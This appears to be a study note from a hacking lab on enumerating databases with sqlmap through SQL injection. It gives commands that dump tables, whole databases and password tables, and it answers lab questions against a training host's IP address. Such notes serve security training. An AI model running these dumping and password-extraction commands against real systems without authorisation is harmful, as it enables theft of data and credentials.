# 🏇 Database Enumeration

Enumeration usually starts with the retrieval of the basic information:

* Database version banner (switch `--banner`)
* Current user name (switch `--current-user`)
* Current database name (switch `--current-db`)
* Checking if the current user has DBA (administrator) rights.

```shell-session
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

after finding the current database name (i.e. `testdb`) we might want to find the table names -> `--tables` option and specifying the DB name with `-D testdb`

```shell-session
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

And after finding the name, we can use `--dump` option and specify the table name with `-T users`

```shell-session
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```

It will produce a .CSV file that we can use in SQLite:

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

If we want to do conditional enumeration and retrieve certain rows we can use the option `--where`, as follows

```shell-session
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

By simply using the switch `--dump` without specifying a table with `-T`, all of the current database content will be retrieved. As for the `--dump-all` switch, all the content from all the databases will be retrieved.

_**What's the contents of table flag1 in the testdb database? (Case #1)**_

```
sqlmap http://94.237.53.113:50888/case1.php?id=1 --dump -T flag1 -D testdb
```

## Advanced Database Enumeration

have a complete overview of the database architecture, we could use the switch `--schema`

```shell-session
sqlmap -u "http://www.example.com/?id=1" --schema
```

It would turn out something like that:

```
...SNIP...
Database: master
Table: log
[3 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| date   | datetime     |
| agent  | varchar(512) |
| id     | int(11)      |
+--------+--------------+

Database: owasp10
Table: accounts
[4 columns]
+-------------+---------+
| Column      | Type    |
+-------------+---------+
| cid         | int(11) |
| mysignature | text    |
| password    | text    |
| username    | text    |
+-------------+---------+
...
Database: testdb
Table: data
[2 columns]
+---------+---------+
| Column  | Type    |
+---------+---------+
| content | blob    |
| id      | int(11) |
+---------+---------+

Database: testdb
Table: users
[3 columns]
+---------+---------------+
| Column  | Type          |
+---------+---------------+
| id      | int(11)       |
| name    | varchar(500)  |
| surname | varchar(1000) |
+---------+---------------+
```

we can search for databases, tables, and columns of interest, by using the `--search` option

```shell-session
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

It would turn out:

```
..SNIP...
[14:24:19] [INFO] searching tables LIKE 'user'
Database: testdb
[1 table]
+-----------------+
| users           |
+-----------------+

Database: master
[1 table]
+-----------------+
| users           |
+-----------------+
```

We could also have tried to search for all column names based on a specific keyword (e.g. `pass`):

```shell-session
sqlmap -u "http://www.example.com/?id=1" --search -C pass
```

### Password Enumeration and Cracking

Once we identify a table containing passwords (e.g. `master.users`), we can retrieve that table with the `-T` option

```shell-session
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```

_**What's the name of the column containing "style" in it's name? (Case #1)**_

```
sqlmap -u "http://94.237.53.113:50888/case1.php?id=1" --search -C style
```

_**What's the Kimberly user's password? (Case #1)**_

```
sqlmap -u "http://94.237.53.113:50888/case1.php?id=1" --search -T users
```
